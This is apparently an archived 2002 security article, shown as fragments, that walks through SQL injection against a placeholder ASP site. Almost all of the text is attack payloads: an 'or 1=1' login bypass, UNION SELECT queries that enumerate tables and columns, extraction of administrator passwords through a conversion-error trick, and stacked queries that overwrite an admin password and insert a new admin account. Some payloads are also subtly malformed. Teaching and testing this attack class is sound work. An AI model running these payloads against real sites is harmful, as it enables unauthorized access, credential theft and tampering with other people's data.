...
date: 2002-06-01T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-402"
---

文章提交：[SQL](http://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=18291) (sql_at_263.net)
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10)
...
Into login, or password, or even in the URL. Example:
 ...
 - [http://duck/index.asp?id=hi'](http://duck/index.asp?id=hi') or 1=1--
...
[http://duck/index.asp?category=food](http://duck/index.asp?category=food)
...
[http://duck/index.asp?category=food'](http://duck/index.asp?category=food') or 1=1--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('table1')--

We also can search for data using LIKE keyword:

[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25login%25'--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login'--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id')--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id','login_name','password',details')--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 login_name FROM admin_login--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 password FROM admin_login where login_name='neo'--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 password FROM admin_login where login_name='trinity'--
...
[http://duck/index.asp?id=10](http://duck/index.asp?id=10) UNION SELECT TOP 1 convert(int, password%2b'%20morpheus') FROM admin_login where login_name='trinity'--
...
[http://duck/index.asp?id=10;](http://duck/index.asp?id=10;) UPDATE 'admin_login' SET 'password' = 'newpas5' WHERE login_name='neo'--

To INSERT a new record into the database:

[http://duck/index.asp?id=10;](http://duck/index.asp?id=10;) INSERT INTO 'admin_login' ('login_id', 'login_name', 'password', 'details') VALUES (666,'neo2','newpas5','NA')--
...
[http://www.owasp.org/asac/input_validation/sql.shtml](http://www.owasp.org/asac/input_validation/sql.shtml) 
